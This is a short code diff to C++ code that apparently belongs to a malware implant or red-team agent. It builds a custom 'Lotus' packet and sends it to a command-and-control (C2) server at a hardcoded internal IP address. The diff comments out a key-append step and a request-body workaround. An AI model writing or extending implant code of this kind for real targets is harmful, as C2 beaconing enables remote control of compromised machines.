@@ -69,8 +69,11 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
 
     unsigned char header[82] = { 0 };
     buildLotusHeader(header, data.size(), key.length());
-
     std::vector<unsigned char> lotus_packet(header, header + 82);
+    
+    // append key after header
+    // lotus_packet.insert(lotus_packet.end(), key.begin(), key.end());
+    
     lotus_packet.insert(lotus_packet.end(), data.begin(), data.end());
 
     // convert data to string for building HTTP request
@@ -89,8 +92,8 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
         return;
     }
 
-    // overwriting the request string until C2 has HTTP request functionality
-    requestBody = lotus_packet_str;
+    // uncomment to overwrite the request string while C2 doesn't have HTTP request functionality
+    // requestBody = lotus_packet_str;
 
     // create socket
     std::string host = "10.37.129.4";
